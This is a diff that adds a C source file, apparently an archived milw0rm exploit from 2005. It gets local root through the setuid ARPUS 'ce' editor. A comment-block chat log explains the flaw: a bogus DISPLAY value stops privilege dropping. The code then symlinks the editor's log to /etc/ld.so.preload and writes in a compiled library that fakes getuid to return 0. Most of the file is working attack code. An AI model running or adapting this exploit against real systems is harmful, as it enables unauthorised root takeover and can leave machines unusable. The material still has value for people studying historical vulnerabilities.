@@ -1,0 +1,75 @@
+/*
+* Copyright Kevin Finisterre - ripped from my perl_ex.c
+*
+* ** DISCLAIMER ** I am in no way responsible for your stupidity.
+* ** DISCLAIMER ** I am in no way liable for any damages caused by compilation and or execution of this code.
+*
+* ** WARNING ** DO NOT RUN THIS UNLESS YOU KNOW WHAT YOU ARE DOING ***
+* ** WARNING ** overwriting /etc/ld.so.preload can severly fuck up your box (or someone elses).
+* ** WARNING ** have a boot disk ready incase some thing goes wrong.
+*
+* Setuid ARPUS/ce exploit by KF - kf_lists[at]digitalmunition[dot]com - 4/21/05
+*
+* kfinisterre@kfinisterre01:~$ ls -al /usr/bin/ce
+* -rwsr-xr-x  1 root bin 630010 Sep 27  2004 /usr/bin/ce
+*
+* Tested against http://168.158.26.15/ce/ce-0260-intel-pentium-linux-fedoracore3.tar.gz
+*  and ce-0254-intel-pentium-linux-redhat73.tar.Z
+*
+* (16:34:04) kfin80: this program is tricky
+* (16:34:14) kfin80: it drops privs under certain conditions
+* (16:34:20) kfin80: it was fucking me up for a second. =]
+* (16:36:02) kfin80: kfinisterre@kfinisterre01:~$ ce a a
+* (16:36:13) kfin80: kfinisterre@kfinisterre01:~$ ls -al /tmp/ce_edit_log
+* -rwxrwxrwx  1 kfinisterre kfinisterre 6594 Apr 21 16:35 /tmp/ce_edit_log
+* (16:36:16) kfin80: owned by ME
+* (16:36:36) kfin80: kfinisterre@kfinisterre01:~$ export DISPLAY=yamom
+* kfinisterre@kfinisterre01:~$ rm /tmp/ce_edit_log
+* kfinisterre@kfinisterre01:~$ ce a a
+* ce: cannot connect to X server yamom (Success)
+* kfinisterre@kfinisterre01:~$ ls -al /tmp/ce_edit_log
+* -rwxrwxrwx  1 root kfinisterre 107 Apr 21 16:36 /tmp/ce_edit_log
+* (16:36:38) d4yj4y: hmmmmmm
+* (16:36:38) kfin80: owned by root
+* (16:36:49) kfin80: the export of a faulty display makes it NOT drop privs.
+*
+*/
+
+#define PRELOAD "/etc/ld.so.preload"
+#include <stdio.h>
+#include <strings.h>
+
+int main(int *argc, char **argv)
+{
+
+       FILE *getuid;
+       if(!(getuid = fopen("/tmp/getuid.c","w+"))) {
+               printf("error opening file\n");
+               exit(1);
+       }
+
+       fprintf(getuid, "int getuid(){return 0;}\n" );
+       fclose(getuid);
+
+       system("cc -fPIC -Wall -g -O2 -shared -o /tmp/getuid.so /tmp/getuid.c -lc");
+
+       symlink(PRELOAD,"/tmp/ce_edit_log");
+       umask(001); // I'm rw-rw-rw james bitch!
+
+       putenv("DISPLAY=dmr0x!");  // GIMME ROOT BITCH!
+       system("/usr/bin/ce");
+       FILE *ld_so_preload;
+
+       char preload[] = {
+               "/tmp/getuid.so\n"
+       };
+
+       if(!(ld_so_preload = fopen(PRELOAD,"w+"))) {
+               printf("error opening file\n");
+               exit(1);
+       }
+       fwrite(preload,sizeof(preload)-1,1,ld_so_preload);
+       fclose(ld_so_preload);
+}
+
+// milw0rm.com [2005-05-01]
